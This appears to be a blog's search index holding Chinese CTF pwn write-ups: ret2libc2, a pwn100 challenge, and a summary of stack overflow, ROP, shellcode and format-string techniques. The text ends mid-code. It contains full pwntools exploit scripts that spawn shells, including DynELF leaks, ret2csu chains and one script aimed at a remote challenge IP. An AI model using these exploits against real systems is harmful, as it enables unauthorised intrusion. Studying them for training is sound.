<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>歪比巴卜</title>
      <link href="/2021/10/29/%E6%AD%AA%E6%AF%94%E5%B7%B4%E5%8D%9C/"/>
      <url>/2021/10/29/%E6%AD%AA%E6%AF%94%E5%B7%B4%E5%8D%9C/</url>
      
        <content type="html"><![CDATA[<p>别比别比？歪比巴卜！</p><p>诶，现在我们就要起飞了，飞，诶飞~~~~</p>]]></content>
      
      
      
        <tags>
            
            <tag> 娃娃肉 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc2</title>
      <link href="/2021/02/19/ret2libc2/"/>
      <url>/2021/02/19/ret2libc2/</url>
      
        <content type="html"><![CDATA[<p>菜鸡基础不牢被pwn200打回原形，于是自闭了一段时间后决定看看之前学过的补补基础（果然基础不牢，地动山摇）</p><p>pwn200在网上看了师傅的exp发现有一段payload看不懂，问了樊总，樊总让我自己再看看参数是怎么传的qwq，果然传参理解的还是不透彻，看了B站里的视频终于看懂了，开心到起飞，芜湖~（灰常感谢B站的那个师傅，师傅们都太强辣）</p><p>以ctf-wiki上ret2libc2这个经典为例讲一下</p><h1><span id="0x01-查壳">0x01 查壳</span></h1><p><img src="/images/ret2libc2/1.png" alt="1"></p><h1><span id="0x02-丢ida">0x02 丢IDA</span></h1><p><img src="/images/ret2libc2/2.png" alt="2"></p><p><img src="/images/ret2libc2/3.png" alt="3"></p><p><img src="/images/ret2libc2/4.png" alt="4"></p><h1><span id="0x03-分析">0x03 分析</span></h1><p>可以看到gets函数存在栈溢出</p><p>搜索字符串发现并没有/bin/sh</p><p>但是我们可以构造payload调用gets把/bin/sh写入一个固定地址再传给system函数</p><p>一般在程序中bss段会分配很大空间，所以我们可以随便找一个地址写入/bin/sh</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*112 + p32(elf.plt[gets]) + &#39;aaaa&#39; + p32(elf.bss()+0x100)</span><br></pre></td></tr></table></figure><p>这个过程就是调用gets，可写入地址为bss段，返回地址为 ‘aaaa’</p><p>但是问题是，如果这样写就无法调用system</p><p>所以我们就要用gadget实现system的调用，也就是rop技术</p><p><strong>因为函数被调用时push了参数，当函数结束调用时就需要pop出参数以实现堆栈平衡，并且可以通过ret来跳转到其他地址</strong></p><p>如果程序中存在 <strong>pop eax;ret</strong> ，就可以将 ‘aaaa’ 的地址替换为 <strong>pop eax;ret</strong> 的地址 ，从而调用system</p><p>像 <strong>pop eax;ret</strong> 这种以ret结尾的就叫gadget，我们甚至可以利用gadget实现无限套娃</p><p>寻找gadget的地址可以用ROPgadget手动查找，也可以用pwntools自带的自动查找</p><p>手动:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc2 --only &#39;pop|ret&#39;|grep &#39;pop&#39;</span><br></pre></td></tr></table></figure><p>自动: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elf &#x3D; ELF(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">rop &#x3D; ROP(elf)</span><br><span class="line">payload &#x3D; &#39;a&#39;*112 + p32(elf.plt[gets]) + p32(rop.search(8).address) + p32(elf.bss()+0x100) + p32(system_addr) </span><br></pre></td></tr></table></figure><p>此时执行完gets后就会执行system</p><p>注意rop.search(8)这，因为 pop <strong>eax;ret</strong> 这个过程esp会被降低2*4个字节</p><h1><span id="0x04-exp">0x04 exp</span></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">rop &#x3D; ROP(elf)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*112 + p32(elf.plt[&#39;gets&#39;]) + p32(rop.search(8).address) + p32(elf.bss()+0x100) + p32(elf.symbols[&#39;system&#39;]) + &#39;aaaa&#39; + p32(elf.bss()+0x100)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*112 + p32(elf.plt[&#39;gets&#39;]) + p32(rop.search(8).address) + p32(elf.bss()+0x100) + p32(elf.symbols[&#39;system&#39;]) + &#39;aaaa&#39; + p32(elf.bss()+0x100)</span><br></pre></td></tr></table></figure><p>这里就是执行了gets(elf.bss()+0x100)</p><p>然后执行了system(elf.bss()+0x100)</p><p>中间通过一个gadget链接</p><p>程序执行到gets的时候会等待我们输入</p><p>此时输入 p.sendline(‘/bin/sh’)即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn进阶pwn100</title>
      <link href="/2021/02/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6pwn100/"/>
      <url>/2021/02/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6pwn100/</url>
      
        <content type="html"><![CDATA[<h1><span id="参考">参考</span></h1><p>DynELF讲解：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157</a></p><p><a href="https://www.anquanke.com/post/id/85129">【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客，安全资讯平台 (anquanke.com)</a></p><p>万能gadget讲解：</p><p><a href="https://xz.aliyun.com/t/5597#toc-1">万能gadget</a></p><h1><span id="0x01-查壳">0x01 查壳</span></h1><p><img src="/images/pwn1001.png" alt="pwn1001"></p><h1><span id="0x02-丢ida">0x02 丢IDA</span></h1><p><img src="/images/pwn1002.png" alt="pwn1002"></p><p><img src="/images/pwn1003.png" alt="pwn1003"></p><p>可以发现sub_40068E函数存在栈溢出</p><p><img src="/images/pwn1004.png" alt="pwn1004"></p><p>没有system也没有binsh，题目本身也没有给出libc文件</p><h1><span id="0x03-分析">0x03 分析</span></h1><h2><span id="step1用dynelf泄露出system地址">step1：用DynELF泄露出system地址</span></h2><p>在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。（具体不多说，详情请见上方链接）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def leak(addr):</span><br><span class="line">count &#x3D; 0</span><br><span class="line">up &#x3D; &#39;&#39;</span><br><span class="line">content &#x3D;  &#39;&#39;</span><br><span class="line">payload &#x3D;  &#39;a&#39;*72#padding</span><br><span class="line">payload +&#x3D; p64(pop_rdi)#puts参数的写入，因为是64位，将esp赋给rdi的同时把addr地</span><br><span class="line">payload +&#x3D; p64(addr)#址放入rdi</span><br><span class="line">    payload +&#x3D; p64(puts_addr)</span><br><span class="line">payload +&#x3D; p64(start_addr)#puts返回地址为start</span><br><span class="line">payload &#x3D;  payload.ljust(200,&#39;a&#39;)                                                                                              </span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line">while True:</span><br><span class="line">c&#x3D;p.recv(numb&#x3D;1,timeout&#x3D;0.1)</span><br><span class="line">count+&#x3D;1</span><br><span class="line"> </span><br><span class="line">if up &#x3D;&#x3D; &#39;\n&#39; and c &#x3D;&#x3D; &quot;&quot;: </span><br><span class="line">content&#x3D;content[:-1]+&#39;\x00&#39;</span><br><span class="line">break</span><br><span class="line">else:</span><br><span class="line">content+&#x3D;c</span><br><span class="line">up&#x3D;c</span><br><span class="line">content&#x3D;content[:4]</span><br><span class="line">    log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">return content</span><br><span class="line"></span><br><span class="line">d &#x3D; DynELF(leak, elf &#x3D; elf)</span><br><span class="line">system_addr &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)</span><br><span class="line">log.info(&quot;system_addr &#x3D; %#x&quot;, system_addr) #print(&quot;system_addr &#x3D; &quot;,hex(system_addr))</span><br></pre></td></tr></table></figure><p>大概流程为将ret覆盖为puts，200个字符输入后输出“bye~”程序结束到 ret，ret到puts函数后执行puts泄露出地址，再返回到start函数</p><h2><span id="step2ret2csu">step2：ret2csu</span></h2><p>方法不多说了，详情见上方链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&#39;a&#39;*72</span><br><span class="line">payload+&#x3D;p64(gadget1)</span><br><span class="line">payload+&#x3D;p64(0)      #rbx&#x3D;0</span><br><span class="line">payload+&#x3D;p64(1)      #rbp&#x3D;1  call </span><br><span class="line">payload+&#x3D;p64(read_got)# read</span><br><span class="line">payload+&#x3D;p64(8)#read size</span><br><span class="line">payload+&#x3D;p64(binsh_addr)</span><br><span class="line">payload+&#x3D;p64(0)#r15 read canshu</span><br><span class="line">payload+&#x3D;p64(gadget2)</span><br><span class="line">payload+&#x3D;&#39;\x00&#39;*56</span><br><span class="line">payload+&#x3D;p64(start_addr)</span><br><span class="line">payload&#x3D;payload.ljust(200,&#39;a&#39;)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&#39;bye~\n&#39;)</span><br><span class="line">p.send(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/pwn1005.png" alt="pwn1005"></p><p>大概流程是将ret覆盖成gadget1的地址，此时跳转到<strong>pop rbx</strong>，再加p64（0）相当于把rbx赋值为0，依此类推，一直到ret，此时ret被gadget2覆盖，跳转到gadget2，也就是<strong>mov rbx,r13</strong>，将r13，r14，r15d依次赋值给rdx，rsi，edi，也就是call函数（read）的三个参数【read (0,binsh_addr,8)】，再call read（此时rbx=0，所以地址就是r12，也就是read），再将rbx（0）+1，与rbp（1）比较，两者相等，从而不会跳转到 loc 函数，继续向下执行，到 <strong>add rsp,8</strong>，一路向下一直到 <strong>pop r15</strong>，rsp总共增加了56，所以需要56个字符去填，再讲ret覆盖成start的地址，因为调用了read函数，所以还要发送一个/bin/sh，将其写入binsh_addr</p><h2><span id="step3调用system-getshell">step3：调用system getshell</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;A&quot;*72</span><br><span class="line">payload +&#x3D; p64(pop_rdi)#system(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">payload +&#x3D; p64(binsh_addr)</span><br><span class="line">payload +&#x3D; p64(system_addr)</span><br><span class="line">payload &#x3D; payload.ljust(200, &quot;B&quot;)</span><br></pre></td></tr></table></figure><p>这个就不多说了，同step2的read参数调用（64位就是酱紫）</p><h1><span id="0x04-完整exp">0x04 完整exp</span></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;pwn-100&#39;)</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,44266)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn-100&quot;)</span><br><span class="line"></span><br><span class="line">puts_addr &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">pop_rdi &#x3D; 0x400763</span><br><span class="line">start_addr &#x3D; 0x0400550</span><br><span class="line">part1 &#x3D; 0x040075A</span><br><span class="line">part2 &#x3D; 0x0400740</span><br><span class="line">#binsh_addr &#x3D; 0x0601078</span><br><span class="line">binsh_addr &#x3D; 0x60107c</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line">count &#x3D; 0</span><br><span class="line">up &#x3D; &#39;&#39;</span><br><span class="line">content &#x3D;  &#39;&#39;</span><br><span class="line">payload &#x3D;  &#39;a&#39;*72</span><br><span class="line">payload +&#x3D; p64(pop_rdi)</span><br><span class="line">payload +&#x3D; p64(addr)</span><br><span class="line">    payload +&#x3D; p64(puts_addr)</span><br><span class="line">payload +&#x3D; p64(start_addr)</span><br><span class="line">payload &#x3D;  payload.ljust(200,&#39;a&#39;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line">while True:</span><br><span class="line">c&#x3D;p.recv(numb&#x3D;1,timeout&#x3D;0.1)</span><br><span class="line">count+&#x3D;1</span><br><span class="line"> </span><br><span class="line">if up &#x3D;&#x3D; &#39;\n&#39; and c &#x3D;&#x3D; &quot;&quot;: </span><br><span class="line">content&#x3D;content[:-1]+&#39;\x00&#39;</span><br><span class="line">break</span><br><span class="line">else:</span><br><span class="line">content+&#x3D;c</span><br><span class="line">up&#x3D;c</span><br><span class="line">content&#x3D;content[:4]</span><br><span class="line">    log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">return content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d &#x3D; DynELF(leak, elf &#x3D; elf)</span><br><span class="line">system_addr &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)</span><br><span class="line">log.info(&quot;system_addr &#x3D; %#x&quot;, system_addr)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x40+0x8)</span><br><span class="line">payload +&#x3D; p64(part1)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(1)</span><br><span class="line">payload +&#x3D; p64(read_got)</span><br><span class="line">payload +&#x3D; p64(8)</span><br><span class="line">payload +&#x3D; p64(binsh_addr)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(part2)</span><br><span class="line">payload +&#x3D; &#39;\00&#39;*56</span><br><span class="line">payload +&#x3D; p64(start_addr)</span><br><span class="line">payload &#x3D; payload.ljust(200,&#39;a&#39;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&quot;bye~&quot;)</span><br><span class="line">p.send(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;A&quot;*72</span><br><span class="line">payload +&#x3D; p64(pop_rdi)#system(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">payload +&#x3D; p64(binsh_addr)</span><br><span class="line">payload +&#x3D; p64(system_addr)</span><br><span class="line">payload &#x3D; payload.ljust(200, &quot;B&quot;)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后，非常感谢师傅能带着我一步步理解，菜鸡自己慢慢琢磨实在是太秃头了qwq</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>get_started_3dsctf_2016</title>
      <link href="/2021/02/16/buu%20get-started-3dsctf-2016/"/>
      <url>/2021/02/16/buu%20get-started-3dsctf-2016/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/bhxdn/p/12679290.html">https://www.cnblogs.com/bhxdn/p/12679290.html</a></p><p> <a href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大总结</title>
      <link href="/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/"/>
      <url>/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1><span id="0x01-nc直接连">0x01 nc直接连</span></h1><p>当题目中直接出现了**”/bin/sh”<strong>、</strong>cat flag**时运行后nc即可</p><p><strong><em>例题：攻防世界 get_shell</em></strong></p><h1><span id="0x02-变量的覆盖">0x02 变量的覆盖</span></h1><p>1.算出两变量在段中的差值:</p><ul><li><p>​     可以直接在payload中直接写算式【’a’*(0x6C-0x68)】</p></li><li><p>​     也可以用计算器算出结果后再写入payload【’a’*4】</p></li></ul><p>2.再加上想输入的值</p><p><strong><em>例题：攻防世界 hello_pwn</em></strong></p><p><img src="/images/zj5.png" alt="zj5"></p><p><img src="/images/zj6.png" alt="zj6"></p><p>可以看到unk_601068允许输入的长度是10，而unk_601068和dword_60106C在.bss段相差4（6c-68）</p><p>于是可以想到在unk_601068中输入4个数覆盖掉dword_60106C再输入自己想要的值</p><p>payload = ‘a’*4 + p64(1853186401)</p><h1><span id="0x03-栈溢出">0x03 栈溢出</span></h1><p>栈溢出是指向栈中写入了超出限定长度的数据，溢出的数据会覆盖栈中其它数据，从而影响程序的运行。</p><p><strong>前提：stack未开启</strong></p><p>算出变量到ret的长度，再写入想输入的值即可</p><p><strong><em>例题：攻防世界 level0</em></strong></p><p><img src="/images/zj7.png" alt="zj7"></p><p><img src="/images/zj8.png" alt="zj8"></p><p><img src="/images/zj9.png" alt="zj9"></p><p><img src="/images/zj10.png" alt="zj10"></p><p>可以看出没有开启栈保护，200远大于80</p><p>直接栈溢出即可</p><p>payload = ‘a’*(0x80+0x08) + p64(0x040059A)</p><h1><span id="0x04-gets溢出漏洞">0x04 gets()溢出漏洞</span></h1><p>例如 gets(s) , 不管 s  的空间是否够用，gets函数一直都会往s里输东西，这就存在溢出问题</p><p>于是可以用gets()溢出来达到修改某个变量的值的效果</p><p><strong><em>例题：攻防世界 when_did_you_born</em></strong></p><p><img src="/images/zj11.png" alt="zj11"></p><p>gets函数的漏洞，利用v4覆盖掉v5的地址后改为1926即可</p><p><img src="/images/zj12.png" alt="zj12"></p><h1><span id="0x05-rop">0x05 ROP</span></h1><p>一直把栈溢出的作用当成了ROP的作用，后来才发现栈溢出只是ROP里的一个环节</p><p>栈溢出控制点一般是在ret处，ROP的核心思想就是<strong>利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程</strong></p><h2><span id="0x001-ret2text">0x001 ret2text</span></h2><p>ret2text 又可以理解为是ret to text，顾名思义就是<strong>将应该返回EIP的地址改成text中的某个地址</strong></p><p>上面0x03栈溢出提到的level0就是个很好的例子，就不赘述了</p><p>讲讲攻防世界的level2：</p><p><strong><em>例题：攻防世界level2</em></strong>（system内并没有写入“/bin/sh”地址）</p><p><img src="/images/zj13.png" alt="zj13"></p><p><img src="/images/zj14.png" alt="zj14"></p><p>这应该是属于ret2text的一种变式，很明显的栈溢出</p><p>按f12发现给出了system和”/bin/sh”，但是点开system会发现system内并没有写入“/bin/sh”</p><p><img src="/images/zj24.png" alt="zj24"></p><p>“/bin/sh”的地址被单独给出来了</p><p><img src="/images/zj25.png" alt="zj25"></p><p>所以要在payload中将“/bin/sh”写入system</p><p>system()和“/bin/sh”的地址怎么找呢？</p><p>一种是在IDA中直接找（之前太菜找不到，尤其是找system）</p><p>一种是在payload中通过函数查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br></pre></td></tr></table></figure><p>最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*(0x88+0x4) + p32(sys_addr) + &#39;aaaa&#39; + p32(sh_addr)# &#39;aaaa&#39;是system函数的返回地址</span><br></pre></td></tr></table></figure><p><strong><em>例题：攻防世界cgpwn2</em></strong>（ 没有/bin/sh）</p><p>可将/bin/sh写入未初始化变量                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </p><h2><span id="0x002-ret2shellcode">0x002 ret2shellcode</span></h2><p><strong>将返回地址（EIP）覆盖到我们插入shellcode的首地址</strong></p><p><strong>前提：NX未开启</strong></p><p>先讲讲shellcode的概念：shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。说白了就是一段能得到权限的独立代码</p><p>利用pwntools中自带的shellcraft基本写法（应该可以当模板记）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前缀：context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure><p><strong><em>例题：攻防世界string</em></strong></p><p>详情见其他博客</p><h2><span id="0x003-ret2libc">0x003 ret2libc</span></h2><p>当开启了NX时，数据所在的内存页会标记为不可执行，此时再执行shellcode就会抛出异常。既然注入新代码不可行，那么就复用程序中已有的代码。而libc.so几乎在每个程序执行时都会加载，就可以利用libc中的函数。（当然 .text 中本身就有可用函数更好 , .text走投无路才会想着用libc）</p><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><p>具体GOT、PLT知识见：<a href="https://linyt.blog.csdn.net/article/details/51635768">https://linyt.blog.csdn.net/article/details/51635768</a></p><p>整个看了个大概，但是有些地方还是有点懵</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GCC编译（一段完整代码的运行）可分为预处理、编译、汇编、链接四个阶段</p><p>当处在汇编阶段时，所有元素的地址都是虚拟的，链接操作后，所有元素的地址才会被修改（重定位）为实际地址</p><p>printf函数位于glibc动态库中，编译阶段编译器并不知道printf函数是在suoyiglibc库中的（链接阶段是可以知道printf定义在哪的，只是如果定义在动态库就不知道具体的地址），于是链接器会生成一段额外的小代码片段来获取printf函数地址，并完成对它的调用。</p><p>GOT表示存放函数地址的数据表，PLT表表示额外代码段表。</p><p><img src="/images/zj39.png" alt="zj39"></p><h3><span id="解题思路">解题思路</span></h3><p>附件一般会给出libc.so的文件</p><p>暂时只发现了两种算法，但是原理都是一样的，当有其中一个函数的真实地址后，其他函数的真实地址可以根据偏移值算出</p><p>①算出“参照函数“libc和elf的偏移值，以它为base，再找出所求函数的libc值，再加减base得出真实地址</p><p>例如：攻防世界forgot 的exp</p><p><img src="/images/zj40.png" alt="zj40"></p><p>②算出所求函数与”参照函数“在libc中的偏移值，等到知道”参照函数“的真实地址后，再根据此偏移值算所求函数的真实地址</p><p>例如：攻防世界leve3 的exp</p><p><img src="/images/zj41.png" alt="zj41"></p><p><strong><em>例题：攻防世界level3</em></strong></p><p>详情见其他博客</p><h1><span id="0x06-格式化字符串漏洞">0x06 格式化字符串漏洞</span></h1><p>参考：<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p>（也不知道讲不讲的清。。。。）</p><p>首先了解一个格式化字符串“%n”</p><p>%n表示的是将<strong>已经打印出来的字符个数</strong>，赋值给一个变量</p><p><img src="/images/zj26.png" alt="zj26"></p><p>%n之前打印了5个a，所以n的值变成了5。</p><h2><span id="漏洞成因和基本原理">漏洞成因和基本原理</span></h2><p>正常的printf：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n&#x3D;5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但有人偷懒会写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]&#x3D;&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这是可以输出的，输出就为neuqcsa</p><p>但是当我们输入的是字符串就会出问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span 